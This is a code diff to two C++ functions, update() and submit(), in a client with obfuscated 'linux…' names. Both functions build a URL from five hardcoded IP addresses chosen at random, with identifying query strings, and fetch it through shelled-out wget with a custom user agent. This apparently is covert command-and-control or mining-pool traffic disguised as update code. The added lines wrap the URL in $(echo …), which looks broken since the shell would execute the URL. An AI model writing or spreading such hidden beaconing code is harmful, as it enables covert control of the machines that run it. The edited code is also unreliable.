@@ -967,7 +967,7 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     string response;
 
-    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[4]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];echo \"http://${arr[$rand]}/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com\"");
+    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[4]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];$(echo http://${arr[$rand]}/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com)");
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -1011,7 +1011,7 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     if(__show_linuxweb844412441274_requests)
     LOG("");
     
-    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[4]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];echo \"http://${arr[$rand]}/linux8474.php?linux84=linux84\"");
+    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[4]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];$(echo http://${arr[$rand]}/linux8474.php?linux84=linux84)");
     
     string response;
     
